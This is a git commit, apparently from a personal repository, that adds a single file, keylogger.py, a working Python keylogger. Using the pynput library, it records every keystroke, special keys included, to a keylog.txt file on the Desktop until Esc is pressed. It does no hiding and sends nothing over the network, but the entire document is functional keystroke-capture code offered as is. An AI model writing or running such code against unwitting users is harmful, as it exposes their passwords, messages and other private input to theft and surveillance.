a31e03258ce9bb44b92c17888c2274ee74171b38
Ipsitaprajnasmita369 <ipsitaprajnasmiittaadhal0@gmail.com>
2025-07-20 17:40:06 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+import os
+
+# Save keylog file to Desktop
+log_file = os.path.join(os.path.expanduser("~"), "Desktop", "keylog.txt")
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
